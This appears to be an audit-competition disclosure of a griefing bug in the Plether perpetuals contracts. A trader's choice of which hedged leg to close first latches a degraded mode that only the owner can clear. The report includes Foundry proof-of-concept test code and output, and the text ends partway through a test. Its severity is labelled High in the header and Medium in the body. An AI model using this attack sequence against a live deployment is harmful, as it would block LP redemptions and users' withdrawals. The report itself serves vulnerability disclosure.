# \#99553 [SC-High] Settlement-order-dependent degraded-mode latch blocks LP funding after reserve recovery

**Submitted on Nov 14th 2026 at 07:01:34 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99553
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief / Introduction

I found that a trader can use the order in which two offsetting positions are closed to force Plether into a persistent protocol-wide degraded state, even though the same positions can settle without entering degraded mode and the pool finishes with adequate reserve coverage.

The check in `CfdEngine._enterDegradedModeIfInsolvent()` uses **immediately available pool cash** against the larger side's maximum liability (`E < L`). When a trader closes the profitable side of a hedge first, the pool pays that profit out while the opposite side still accounts for the maximum liability. The first close can therefore push cash below the reserve boundary and set `degradedMode = true`. The losing side is then closed, and its collateralized loss returns cash to the pool. The original shortfall disappears, but the degraded flag remains active because it is only cleared by an explicit owner transaction.

I reproduced the behavior with ordinary V3 Router requests and a 1.2% market-price movement. I then restored the identical pre-close state and executed the same two closes in the opposite order. **Profitable SHORT first entered degraded mode; losing LONG first did not.** In both branches the trader's positions closed completely and no unpaid trader claims remained. The difference is entirely the order of settlement.

While the latch remains set, a Junior LP's matured redemption cannot be funded, a separate trader with a healthy open position cannot withdraw free collateral, and new V3 opens are rejected. I advanced 48 hours, refreshed the Oracle mark and confirmed that LP settlement still reverts. The owner can clear the latch without transferring any additional USDG once reserve coverage recovers; until that privileged action is taken, those operations remain unavailable.

## Vulnerability Details

### 1. The reserve test is evaluated after each individual close

At the end of close settlement, `CfdEngine` invokes `_enterDegradedModeIfInsolvent()`. The function obtains available pool cash net of outstanding trader claims and compares it with the larger aggregate side liability. If `E < L`, it permanently sets the degraded flag for that state transition:

```solidity
uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
// Subtract a pending pool payout, if supplied.
uint256 maxLiabilityAssets = _maxLiability();
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
    emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
}
```

The check uses an instantaneous cash/liability boundary. It does not net the *unsettled* loss of an independent opposite-side position against the winner's payout. This is relevant because the same actor can hold both positions and choose which settlement to execute first.

Importantly, the profitable close really does cross the configured `E < L` boundary. My finding is **not** that this arithmetic comparison is false. The issue is that an actor can induce that transient state through a settlement-order choice and leave the pool operationally disabled even after the opposing loss has settled and reserve coverage is restored.

### 2. The trader chooses which leg settles first

I opened a 20,300,000-unit LONG and an equal-size SHORT across two ordinary trader accounts, using alternating clips to remain within the release skew limit. After moving the Pyth test price from `100000000` to `101200000`, the actual Engine close preview and `PositionClosed` events recorded:

- SHORT: **+243,600.000000 USDG** realized price PnL.
- LONG: **-243,600.000000 USDG** realized price PnL.

The price PnL cancels, but fees, VPI and carry still apply. I did not need to set protocol storage, bypass order admission, act as an administrator or obtain any special keeper authorization.

In the profitable-SHORT-first branch, the SHORT closes while the LONG still contributes to the largest-side liability. The payout reduces available pool cash below the required maximum liability, and degraded mode latches. The LONG subsequently closes, collecting the matching loss and restoring `E >= L`, but cannot clear the already-set latch.

In the control branch, the losing LONG closes first. Its loss enters the pool before the SHORT's payout, and the system remains above the reserve boundary throughout both closes. Degraded mode never activates.

I ran both branches from the same `vm.snapshotState()` checkpoint, including identical positions, pool accounting, price and risk settings.

### 3. A recovered pool remains blocked until the owner clears the latch

`CfdEngine.clearDegradedMode()` is `onlyOwner`, and its only recovery condition is that available cash is at least the current maximum liability. When the condition becomes true, no automatic clearing occurs:

```solidity
function clearDegradedMode() external onlyOwner {
    if (!degradedMode) revert CfdEngine__NotDegraded();
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
        revert CfdEngine__StillInsolvent();
    }
    degradedMode = false;
    emit DegradedModeCleared();
}
```

The initial crossing is therefore enough to create an ongoing dependency on the owner. A separate LP cannot fund a matured redemption through `settleLpEpoch()` while this flag is set because `HousePool._requireWithdrawalsLive()` reverts `HousePool__DegradedMode`. A bystander with an open position also receives `CfdEngine__DegradedMode` on withdrawal, and new V3 risk admission reverts `OrderRouter__DegradedMode`.

The existing *sticky recovery* policy is documented in the accounting specification. My reproduction isolates an additional adversarial trigger for that policy: two economically offsetting positions can be settled in either order, but only one order causes a temporary reserve crossing that leaves the recovered system stuck in containment.

### 4. Exact causal comparison

All amounts below are six-decimal USDG, converted from the passing test's logged atoms.

| State | Winner SHORT first | Loser LONG first |
|---|---:|---:|
| Starting available cash `E` | 20,502,003.189798 | 20,502,003.189798 |
| Starting maximum liability `L` | 20,400,000.000000 | 20,400,000.000000 |
| First close realized price PnL | +243,600.000000 | -243,600.000000 |
| `E` after first close | 20,370,672.289194 | 20,847,627.370445 |
| `L` after first close | 20,400,000.000000 | 20,300,000.000000 |
| `E < L` after first close | **Yes: 29,327.710806 shortfall** | No |
| `E` after both closes | 20,614,384.769771 | 20,605,151.273775 |
| `L` after both closes | 100,000.000000 | 100,000.000000 |
| `degradedMode` after both closes | **true** | **false** |

The two branches start from exactly the same state. Neither has an unpaid trader-claim balance at the end. The difference is not fabricated by manipulating the reserve accounting; it follows from which realized settlement enters the pool first.

## Impact Details

I reproduced an unprivileged operational-griefing path affecting **other LPs and traders**, not a profit-taking or theft of LP principal.

1. **LP redemption funding is blocked.** An LP submits a normal Junior redemption and waits until it matures. After 48 simulated hours and a fresh mark, `router.settleLpEpoch()` still reverts with `HousePool__DegradedMode`. The claimable redemption remains zero because the epoch was never funded. Existing claims that had already been funded before degradation are not affected by this assertion.
2. **Free collateral withdrawal is blocked for another trader with an open position.** The bystander's `clearinghouse.withdraw()` reverts with `CfdEngine__DegradedMode` although the account itself is healthy.
3. **New trading risk is blocked.** The same bystander's ordinary V3 `commitOrder()` reverts with `OrderRouter__DegradedMode`.
4. **Recovery requires privileged intervention.** A non-owner cannot call `clearDegradedMode()`. After both hedge positions close, the owner can clear it immediately *without recapitalization*, after which the same LP redemption becomes fundable and new V3 admission succeeds.

In my release-parameter test, pool assets **increase from 20,502,002.438786 USDG to 20,614,384.769771 USDG** during the attacker-controlled sequence. The two attacker accounts incur **135,830.072096 USDG** of combined cost. The pool finishes with approximately **20.614 million USDG** of available cash against only **100,000 USDG** of remaining maximum side liability. Despite that recovered position, its degraded-mode flag remains active until an owner transaction clears it.

The 48-hour advance proves that the system does not automatically recover with time. I am not relying on the owner being technically unable to clear it for that entire period: the owner can recover as soon as the reserve threshold is restored. The security impact is that an ordinary trader can require that privileged recovery action and deny unrelated users normal operations in the meantime.

I classify this as **Medium — Griefing**, using the competition's listed in-scope impact. The two trader addresses hold legitimate positions; the issue does not rely on bypassing an identity-based account restriction.

## Suggested Remediation

The system should distinguish a transient reserve crossing caused by order-dependent settlement of fully funded opposing positions from a condition that needs indefinite manual containment. A possible approach is to retain the conservative `E < L` detection while allowing a carefully validated recovery path once all affected settlements have completed and fresh on-chain reserve coverage is restored. Alternatively, admission and settlement controls should prevent a trader-controlled ordering from creating protocol-wide persistent containment when the opposite exposure has enough independently locked collateral to settle its loss.

Any automatic or permissionless recovery must revalidate real reserve coverage and preserve the safety properties of genuine insolvency containment. Simply deleting the `E < L` check would not address the underlying issue safely.

## References

- [`CfdEngine._enterDegradedModeIfInsolvent()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369)
- [`CfdEngine.clearDegradedMode()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667)
- [`HousePool.settleLpEpoch()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L835)
- [`HousePool._requireWithdrawalsLive()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1869)
- [`OrderLiquidationBatchLogic` risk-off order gate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L323-L332)
- [`CfdEngineSettlementSidecar` collateral-withdrawal gate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L265-L278)
- [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/)


## Proof of Concept


I reproduced this on the frozen audited commit using Foundry. The tests call the production-format `OrderRouter.commitOrder(OrderV3Types.OrderRequest)` and execution pathways. The existing `BasePerpTest` fixture deploys the protocol; the Router variable is a test fixture's router harness, but the test invokes the same V3 order interface and production execution sidecars. I only mocked the external Pyth price updates and USDG fixture as permitted by the competition. I made no changes to `packages/perps/src`.

**Repository:** `https://github.com/immunefi-team/audit-comp-plether`  
**Commit:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8`  
**Test 1:** `packages/perps/poc/DegradedLatchGriefV3Final.t.sol`  
**Test 2:** `packages/perps/poc/DegradedLatchSettlementOrderV4.t.sol`  
**Test contracts:** `DegradedLatchGriefV3FinalTest`, `DegradedLatchSettlementOrderV4Test`

## Reproduction steps

1. Fund the pool under the release risk parameters. Add a bystander with a live position and a separate Junior LP who can request redemption.
2. Through normal V3 orders, open a 20,300,000-unit LONG and an equal-size SHORT across two attacker-controlled trader accounts, alternating clips to satisfy skew/admission limits. Neither account has special privileges.
3. Advance one hour and update the mocked Pyth basket price from `100000000` to `101200000` (1.2%). Verify that the Engine prices the SHORT at **+243,600 USDG** and LONG at **-243,600 USDG** of realized price PnL.
4. Check that, before either close, available pool cash `E` is greater than max side liability `L`, and `degradedMode` is `false`.
5. Snapshot all contract state. In Branch A, close the profitable SHORT first. Verify `E = 20,370,672.289194`, `L = 20,400,000`, and `degradedMode = true`. Close the losing LONG, confirm both positions are zero and no trader claims remain, and verify `E >= L` but the latch stays on.
6. Restore the exact snapshot. In Branch B, close the losing LONG first. Verify that the pool receives its loss while `E >= L` and no latch activates. Close the SHORT and verify that both positions close without degraded mode.
7. Separately repeat Branch A and submit a Junior LP redemption. After advancing 48 hours, refresh the mark and attempt `settleLpEpoch()`. Confirm `HousePool__DegradedMode` and that the redemption remains unfunded.
8. Confirm that a bystander's free-collateral withdrawal and new V3 order are blocked. Confirm a non-owner cannot clear the latch.
9. Have the owner call `clearDegradedMode()` without sending any USDG. Retry the same LP settlement and a new order commitment. Both now succeed.

## Commands

Copy the two Solidity files included below into `packages/perps/poc/` under their indicated names, then run from `packages/perps`:

```bash
git rev-parse HEAD
# Must print: a82d4fefb02768e5b3bddcc97dee371eee24fea8

export FOUNDRY_TEST=poc
export FOUNDRY_OUT=out-degraded-causal-v4
export FOUNDRY_CACHE_PATH=cache-degraded-causal-v4

forge fmt poc/DegradedLatchGriefV3Final.t.sol
forge fmt poc/DegradedLatchSettlementOrderV4.t.sol

forge test --offline \
  --match-contract '^DegradedLatchSettlementOrderV4Test$' \
  --match-path 'poc/DegradedLatchSettlementOrderV4.t.sol' \
  -vvv

git diff -- src/
```

## Observed console output

Both tests passed together against the audited commit:

```text
Ran 2 tests for poc/DegradedLatchSettlementOrderV4.t.sol:DegradedLatchSettlementOrderV4Test
[PASS] test_Causal_IdenticalHedge_ProfitFirstLatches_LossFirstDoesNot()
  CAUSAL: initial reserve E atoms 20502003189798
  CAUSAL: initial max liability L atoms 20400000000000
  SHORT preview price PnL: 243600000000 atoms
  LONG preview price PnL: -243600000000 atoms
  WINNER FIRST: E after SHORT close atoms 20370672289194
  WINNER FIRST: L after SHORT close atoms 20400000000000
  WINNER FIRST: realized SHORT PnL: 243600000000 atoms
  WINNER FIRST: E after both closes atoms 20614384769771
  WINNER FIRST: L after both closes atoms 100000000000
  WINNER FIRST: sticky latch after recovery true
  LOSER FIRST: E after LONG close atoms 20847627370445
  LOSER FIRST: L after LONG close atoms 20300000000000
  LOSER FIRST: realized LONG PnL: -243600000000 atoms
  LOSER FIRST: E after both closes atoms 20605151273775
  LOSER FIRST: L after both closes atoms 100000000000
  LOSER FIRST: degraded flag false
[PASS] test_PoC_HedgedTraderLatchesSolventPoolAndBlocksUsers()
  LATCH: available pool cash atoms 20370672289194
  LATCH: maximum side liability atoms 20400000000000
  RECOVERED: pool before USDG atoms 20502002438786
  RECOVERED: pool after USDG atoms 20614384769771
  RECOVERED: attacker cost USDG atoms 135830072096
  RECOVERED: available cash E USDG atoms 20614384769771
  RECOVERED: max liability L USDG atoms 100000000000
  RECOVERED: degraded flag remains true
  BLOCKED: LP settlement still blocked after 48 hours
  BLOCKED: bystander withdraw and V3 open rejected
  RECOVERY: owner clears latch and LP funding resumes
  RECOVERY: V3 admission resumes 16
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

The PnL signs are taken from the executed `PositionClosed` events, not assumed from the direction of the price move. The two-branch control directly establishes that the persistence is induced by the settlement sequence and is not caused by an initially under-reserved pool.

## Complete Solidity PoC source — V3: griefing and recovery

**Save as:** `packages/perps/poc/DegradedLatchGriefV3Final.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Reproduce a hedged trader leaving degradedMode latched after
///         all attacker exposure closes and physical reserve coverage returns.
/// @dev Uses canonical V3 order requests, production Router entrypoints,
///      and mocked external Pyth data. No production contract is modified.
contract DegradedLatchGriefV3FinalTest is BasePerpTest {
    address internal constant ATTACKER_LONG = address(0xA77A01);
    address internal constant ATTACKER_SHORT = address(0xA77A02);
    address internal constant CAROL = address(0xCA201);
    address internal constant LP = address(0x1111);
    address internal constant KEEPER = address(0x7106);

    uint256 internal price = 1e8;
    uint256 internal nextClientOrderId = 1;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 20_000_000e6;
    }

    function _tick(uint256 p) internal view returns (bytes[] memory d) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 t = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            (,,, uint256 pub,) = baseMockPyth.prices(ids[i]);
            ticks[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(int64(uint64(p)), 0, -8, t, pub < t ? pub : t - 1)
            );
        }
        d = new bytes[](1);
        d[0] = abi.encode(ticks);
    }

    function _step() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
    }

    function _refresh() internal {
        _step();
        vm.prank(KEEPER);
        router.updateMarkPrice(_tick(price));
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory req) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        uint256 targetPrice = ((side == CfdTypes.Side.LONG) == isClose)
            ? type(uint256).max : 1;

        req = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(nextClientOrderId++),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        _step();
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose);
        vm.prank(account);
        uint64 orderId = router.commitOrder(req);
        assertGt(orderId, 0, "V3 commit must succeed");

        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(orderId, _mockPythUpdateData(price));
        assertEq(
            uint8(result.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "V3 order must execute, not merely be committed"
        );
    }

    function _size(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _wealth(address account) internal view returns (uint256) {
        return clearinghouse.balanceAssets(account)
            + engine.traderClaimBalanceAssets(account);
    }

    function _coverage() internal view returns (uint256 available, uint256 liability) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        available = physical > claims ? physical - claims : 0;
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        liability = longMax > shortMax ? longMax : shortMax;
    }

    function test_PoC_HedgedTraderLatchesSolventPoolAndBlocksUsers() public {
        // Fully activate a real Junior LP deposit before the attack.
        _fundJunior(LP, 500_000e6);
        _fundTrader(CAROL, 50_000e6);
        _fundTrader(ATTACKER_LONG, 400_000e6);
        _fundTrader(ATTACKER_SHORT, 400_000e6);
        vm.deal(KEEPER, 1 ether);
        _refresh();
        _trade(CAROL, CfdTypes.Side.LONG, 100_000e18, 10_000e6, false);

        uint256 poolBefore = pool.totalAssets();
        uint256 attackerBefore = _wealth(ATTACKER_LONG) + _wealth(ATTACKER_SHORT);

        // Alternate LONG and SHORT clips to respect the 40% skew cap.
        uint256 clip = 4_000_000e18;
        uint256 target = 20_300_000e18;
        uint256 longSize;
        uint256 shortSize;
        _trade(ATTACKER_LONG, CfdTypes.Side.LONG, clip / 2, 30_000e6, false);
        longSize = clip / 2;
        while (shortSize < target || longSize < target) {
            if (shortSize < target) {
                uint256 s = target - shortSize < clip ? target - shortSize : clip;
                _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, s, s / 1e12 * 150 / 10_000, false);
                shortSize += s;
            }
            if (longSize < target) {
                uint256 s = target - longSize < clip ? target - longSize : clip;
                _trade(ATTACKER_LONG, CfdTypes.Side.LONG, s, s / 1e12 * 150 / 10_000, false);
                longSize += s;
            }
        }
        assertEq(_size(ATTACKER_LONG), target, "LONG hedge not built");
        assertEq(_size(ATTACKER_SHORT), target, "SHORT hedge not built");
        assertFalse(engine.degradedMode(), "no latch before price move");

        // A 1.2% market move, without privileged price manipulation.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        price = 101_200_000;
        _refresh();

        // Close winning leg: payouts cross the raw E < L reserve boundary.
        _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, target, 0, true);
        assertEq(_size(ATTACKER_SHORT), 0, "winning hedge not closed");
        (uint256 availableAtLatch, uint256 liabilityAtLatch) = _coverage();
        console2.log("LATCH: available pool cash atoms", availableAtLatch);
        console2.log("LATCH: maximum side liability atoms", liabilityAtLatch);
        assertLt(availableAtLatch, liabilityAtLatch, "actual E < L boundary not crossed");
        assertTrue(engine.degradedMode(), "winning-leg close did not latch risk-off");

        // Owner cannot clear while the cash reserve condition remains below L.
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // Close losing leg: its fully collateralized loss restores pool cash.
        _trade(ATTACKER_LONG, CfdTypes.Side.LONG, target, 0, true);
        assertEq(_size(ATTACKER_LONG), 0, "losing hedge not closed");
        assertEq(_size(ATTACKER_SHORT), 0, "attacker exposure remains");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "unpaid trader claims remain");

        uint256 poolAfter = pool.totalAssets();
        uint256 attackerAfter = _wealth(ATTACKER_LONG) + _wealth(ATTACKER_SHORT);
        (uint256 recoveredCash, uint256 recoveredLiability) = _coverage();
        assertGe(recoveredCash, recoveredLiability, "E >= L did not recover");
        assertGt(poolAfter, poolBefore, "pool did not gain cash across the sequence");
        assertLe(attackerAfter, attackerBefore, "unexpected attacker net profit");
        assertTrue(engine.degradedMode(), "containment unexpectedly cleared itself");

        console2.log("RECOVERED: pool before USDG atoms", poolBefore);
        console2.log("RECOVERED: pool after USDG atoms", poolAfter);
        console2.log("RECOVERED: attacker cost USDG atoms", attackerBefore - attackerAfter);
        console2.log("RECOVERED: available cash E USDG atoms", recoveredCash);
        console2.log("RECOVERED: max liability L USDG atoms", recoveredLiability);
        console2.log("RECOVERED: degraded flag remains", engine.degradedMode());

        // A matured LP redemption remains unfunded for 48h while owner is idle.
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        uint256 shares = juniorVault.balanceOf(LP);
        assertGt(shares, 0, "LP must own shares");
        vm.prank(LP);
        juniorVault.requestRedeem(shares, LP, LP);
        uint256 redemptionId = juniorVault.controllerRedeemHead(LP);
        assertGt(redemptionId, 0, "redemption not recorded");

        vm.warp(vm.getBlockTimestamp() + 48 hours);
        _refresh();
        bytes[] memory blockedSettlementData = _tick(price);
        vm.prank(KEEPER);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        router.settleLpEpoch(blockedSettlementData);
        assertEq(
            juniorVault.claimableRedeemRequest(redemptionId, LP), 0,
            "redemption unexpectedly funded under latch"
        );
        console2.log("BLOCKED: LP settlement still blocked after 48 hours");

        // Bystander withdrawal and new risk are also blocked.
        vm.prank(CAROL);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(CAROL, 1_000e6);

        _step();
        OrderV3Types.OrderRequest memory blockedReq =
            _request(CfdTypes.Side.LONG, 100_000e18, 5_000e6, false);
        vm.prank(CAROL);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        router.commitOrder(blockedReq);
        console2.log("BLOCKED: healthy bystander withdraw and V3 open rejected");

        // A public account cannot clear, but the actual owner can with no new cash.
        vm.prank(ATTACKER_LONG);
        vm.expectRevert(
            abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, ATTACKER_LONG)
        );
        engine.clearDegradedMode();
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner did not clear recovered latch");

        // The same pending LP request becomes fundable without recapitalization.
        bytes[] memory recoveredSettlementData = _tick(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(recoveredSettlementData);
        assertGt(
            juniorVault.claimableRedeemRequest(redemptionId, LP), 0,
            "owner recovery did not restore LP redemption funding"
        );
        console2.log("RECOVERY: owner clears latch and LP funding resumes");

        vm.prank(CAROL);
        uint64 resumedOpenId = router.commitOrder(blockedReq);
        assertGt(resumedOpenId, 0, "V3 risk admission did not resume");
        console2.log("RECOVERY: V3 open admission resumes", uint256(resumedOpenId));
    }
}

```

## Complete Solidity PoC source — V4: identical-state causal control

**Save as:** `packages/perps/poc/DegradedLatchSettlementOrderV4.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {DegradedLatchGriefV3FinalTest} from "./DegradedLatchGriefV3Final.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Execution-order control for the already passing degraded-mode V3 PoC.
/// @dev The two branches are taken from the exact same pre-close state.
///      Only ordinary V3 Router orders are submitted; no protocol storage writes.
contract DegradedLatchSettlementOrderV4Test is DegradedLatchGriefV3FinalTest {
    uint256 private constant TARGET = 20_300_000e18;
    uint256 private constant CLIP = 4_000_000e18;
    uint256 private constant MOVED_PRICE = 101_200_000;

    // The canonical event contains price-only signed PnL, excluding fees/VPI/carry.
    bytes32 private constant POSITION_CLOSED_SIG =
        keccak256("PositionClosed(address,uint8,uint256,uint256,int256)");

    function _buildSameHedgeAsPassingV3() internal {
        _fundJunior(LP, 500_000e6);
        _fundTrader(CAROL, 50_000e6);
        _fundTrader(ATTACKER_LONG, 400_000e6);
        _fundTrader(ATTACKER_SHORT, 400_000e6);
        vm.deal(KEEPER, 1 ether);

        _refresh();
        _trade(CAROL, CfdTypes.Side.LONG, 100_000e18, 10_000e6, false);

        _trade(ATTACKER_LONG, CfdTypes.Side.LONG, CLIP / 2, 30_000e6, false);
        uint256 longSize = CLIP / 2;
        uint256 shortSize;
        while (shortSize < TARGET || longSize < TARGET) {
            if (shortSize < TARGET) {
                uint256 s = TARGET - shortSize < CLIP ? TARGET - shortSize : CLIP;
                _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, s, s / 1e12 * 150 / 10_000, false);
                shortSize += s;
            }
            if (longSize < TARGET) {
                uint256 s = TARGET - longSize < CLIP ? TARGET - longSize : CLIP;
                _trade(ATTACKER_LONG, CfdTypes.Side.LONG, s, s / 1e12 * 150 / 10_000, false);
                longSize += s;
            }
        }
        assertEq(_size(ATTACKER_LONG), TARGET, "long construction differed");
        assertEq(_size(ATTACKER_SHORT), TARGET, "short construction differed");
        assertFalse(engine.degradedMode(), "degraded before price move");

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        price = MOVED_PRICE;
        _refresh();
        assertEq(engine.lastMarkPrice(), MOVED_PRICE, "market move was not applied");
    }

    /// Read the REAL executed PnL from the engine's canonical PositionClosed event.
    /// This avoids assuming which CFD side wins when the basket rises.
    function _closeAndReadRealizedPnl(address account, CfdTypes.Side side)
        internal
        returns (int256 pnl)
    {
        vm.recordLogs();
        _trade(account, side, TARGET, 0, true);
        Vm.Log[] memory recorded = vm.getRecordedLogs();
        bytes32 accountTopic = bytes32(uint256(uint160(account)));

        for (uint256 i; i < recorded.length; ++i) {
            Vm.Log memory entry = recorded[i];
            if (entry.emitter != address(engine)) continue;
            if (entry.topics.length != 2) continue;
            if (entry.topics[0] != POSITION_CLOSED_SIG) continue;
            if (entry.topics[1] != accountTopic) continue;

            (uint8 observedSide, uint256 closedSize, uint256 closePrice, int256 realized) =
                abi.decode(entry.data, (uint8, uint256, uint256, int256));
            assertEq(observedSide, uint8(side), "wrong side in closed event");
            assertEq(closedSize, TARGET, "partial close, not full exit");
            assertEq(closePrice, MOVED_PRICE, "close executed at wrong price");
            assertEq(_size(account), 0, "close left an open position");
            return realized;
        }
        revert("Missing production PositionClosed event");
    }

    function test_Causal_IdenticalHedge_ProfitFirstLatches_LossFirstDoesNot() public {
        _buildSameHedgeAsPassingV3();

        (uint256 startingE, uint256 startingL) = _coverage();
        assertGe(startingE, startingL, "reserve condition already failed before attack");
        assertFalse(engine.degradedMode(), "latch already set before first close");

        ICfdEngineTypes.ClosePreview memory shortPreview =
            engineLens.previewClose(ATTACKER_SHORT, TARGET, MOVED_PRICE);
        ICfdEngineTypes.ClosePreview memory longPreview =
            engineLens.previewClose(ATTACKER_LONG, TARGET, MOVED_PRICE);
        assertTrue(shortPreview.valid, "short close not valid");
        assertTrue(longPreview.valid, "long close not valid");
        assertGt(shortPreview.realizedPnlAssets, 0, "SHORT is not the price-winning leg");
        assertLt(longPreview.realizedPnlAssets, 0, "LONG is not the price-losing leg");

        console2.log("CAUSAL: initial reserve E atoms", startingE);
        console2.log("CAUSAL: initial max liability L atoms", startingL);
        console2.logInt(shortPreview.realizedPnlAssets);
        console2.log("CAUSAL: prior line is SHORT preview price PnL (+) atoms");
        console2.logInt(longPreview.realizedPnlAssets);
        console2.log("CAUSAL: prior line is LONG preview price PnL (-) atoms");

        uint256 snapshot = vm.snapshotState();

        // Branch A: settle the price winner (SHORT) while the loser remains open.
        uint256 cashBeforeA = pool.totalAssets();
        int256 shortPnlA = _closeAndReadRealizedPnl(ATTACKER_SHORT, CfdTypes.Side.SHORT);
        (uint256 eA1, uint256 lA1) = _coverage();
        assertGt(shortPnlA, 0, "SHORT must have actually realized positive price PnL");
        assertLt(pool.totalAssets(), cashBeforeA, "winner close did not drain pool cash");
        assertLt(eA1, lA1, "winner-first did not breach E < L");
        assertTrue(engine.degradedMode(), "winner-first did not latch degraded mode");
        console2.log("WINNER FIRST: E after profitable SHORT close atoms", eA1);
        console2.log("WINNER FIRST: L after profitable SHORT close atoms", lA1);
        console2.logInt(shortPnlA);
        console2.log("WINNER FIRST: prior line is realized SHORT price PnL (+) atoms");

        int256 longPnlA = _closeAndReadRealizedPnl(ATTACKER_LONG, CfdTypes.Side.LONG);
        (uint256 eA2, uint256 lA2) = _coverage();
        assertLt(longPnlA, 0, "LONG must realize negative price PnL");
        assertGe(eA2, lA2, "closing loser did not restore E >= L");
        assertTrue(engine.degradedMode(), "winner-first latch unexpectedly auto-cleared");
        assertEq(_size(ATTACKER_LONG), 0, "winner-first LONG not fully closed");
        assertEq(_size(ATTACKER_SHORT), 0, "winner-first SHORT not fully closed");
